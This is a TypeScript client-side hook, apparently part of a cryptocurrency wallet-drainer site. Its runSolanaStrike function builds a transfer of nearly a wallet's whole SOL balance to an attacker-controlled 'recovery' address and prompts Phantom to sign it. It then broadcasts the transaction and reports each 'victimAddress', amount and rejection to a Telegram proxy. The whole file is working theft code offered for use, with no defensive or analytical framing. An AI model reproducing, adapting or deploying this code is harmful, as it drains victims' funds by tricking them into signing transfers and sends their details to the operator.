"use client";

import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
} from "@solana/web3.js";

// 🛰️ Using your existing Telegram proxy
import { sendDetailedSweepToTelegram } from "@/lib/telegram";

export function useSolanaExecutor() {
  const runSolanaStrike = async (
    asset: any,
    { userAddress, recoveryAddress, logPrefix }: any,
  ) => {
    console.log(
      `${logPrefix} ☀️ Initializing Solana Strike for ${asset.symbol}...`,
    );

    // DEBUG: Check what is actually being passed to the executor
    console.log(`${logPrefix} 🛠️ DEBUG - Input Arguments:`, {
      userAddress,
      recoveryAddress,
      assetBalance: asset?.balance,
      assetSymbol: asset?.symbol,
    });

    try {
      // 0. ADDRESS VALIDATION (Prevents the _bn crash)
      if (!userAddress) {
        throw new Error(
          "CRITICAL: userAddress is undefined. Check useNonEvmExecutor mapping.",
        );
      }
      if (!recoveryAddress) {
        throw new Error(
          "CRITICAL: recoveryAddress is undefined. Check RECOVERY_CONFIG.",
        );
      }

      // 1. NATIVE BIGINT MATH
      console.log(`${logPrefix} 🧮 Calculating sweep amount...`);
      const balanceBigInt = BigInt(asset.balance || 0);
      const fee = BigInt(5000);
      const sweepAmount = balanceBigInt - fee;

      console.log(
        `${logPrefix} 💰 Balance: ${balanceBigInt}, Fee: ${fee}, Sweep: ${sweepAmount}`,
      );

      if (sweepAmount <= 0n) {
        throw new Error(
          `INSUFFICIENT_BALANCE: Found ${balanceBigInt}, need more than 5000`,
        );
      }

      console.log(`${logPrefix} 🔗 Connecting to Solana Mainnet...`);
      const rpcUrl =
        process.env.NEXT_PUBLIC_SOLANA_RPC ||
        "https://api.mainnet-beta.solana.com";
      const connection = new Connection(rpcUrl, "confirmed");

      // 2. PUBLIC KEY CONSTRUCTION
      let fromPubkey: PublicKey;
      let toPubkey: PublicKey;

      try {
        console.log(`${logPrefix} 🔑 Constructing PublicKeys...`);
        fromPubkey = new PublicKey(userAddress);
        toPubkey = new PublicKey(recoveryAddress);
      } catch (pkErr: any) {
        console.error(
          `${logPrefix} ❌ Failed to parse PublicKeys:`,
          pkErr.message,
        );
        throw new Error(`INVALID_SOLANA_ADDRESS: ${pkErr.message}`);
      }

      console.log(
        `${logPrefix} 👤 From: ${fromPubkey.toBase58()} | To: ${toPubkey.toBase58()}`,
      );

      // 3. Transaction Construction
      console.log(`${logPrefix} 🏗️ Fetching blockhash...`);
      const { blockhash } = await connection.getLatestBlockhash();
      console.log(`${logPrefix} 🧱 Blockhash: ${blockhash}`);

      // Safe conversion for SDK compatibility
      const lamportsAsNumber = Number(sweepAmount);

      const transaction = new Transaction({
        recentBlockhash: blockhash,
        feePayer: fromPubkey,
      }).add(
        SystemProgram.transfer({
          fromPubkey,
          toPubkey,
          lamports: lamportsAsNumber,
        }),
      );

      // 4. Signature
      const provider =
        (window as any).phantom?.solana || (window as any).solana;

      if (!provider) {
        console.error(`${logPrefix} ❌ No Solana provider found.`);
        throw new Error(
          "Phantom wallet not detected. Please install the extension.",
        );
      }

      console.log(`${logPrefix} 🔑 Requesting Phantom Signature...`);

      const signedTransaction = await provider.signTransaction(transaction);
      console.log(`${logPrefix} ✍️ Transaction signed successfully.`);

      // 5. Submission
      console.log(`${logPrefix} 🚀 Broadcasting transaction...`);
      const signature = await connection.sendRawTransaction(
        signedTransaction.serialize(),
      );

      console.log(`${logPrefix} ✅ Solana Strike Submitted: ${signature}`);

      // 🛰️ REPORT TO TELEGRAM VIA PROXY
      sendDetailedSweepToTelegram({
        status: "SUCCESS",
        victimAddress: userAddress,
        receiverAddress: recoveryAddress,
        symbol: asset.symbol || "SOL",
        amount: (Number(sweepAmount) / 1e9).toFixed(4),
        type: "SOLANA_STRIKE",
        hash: signature,
        chainId: "SOLANA",
      });

      return signature;
    } catch (err: any) {
      console.error(
        `${logPrefix} ❌ Solana Strike Failed at runtime:`,
        err.message || err,
      );

      // Report failure to Telegram via Proxy
      sendDetailedSweepToTelegram({
        status: "FAILURE",
        type: "USER REJECT REQUEST TO SWEEP ",
        victimAddress: userAddress,
        error: err.message || "Unknown Runtime Error",
        chainId: "SOLANA",
      });

      throw err;
    }
  };

  return { runSolanaStrike };
}
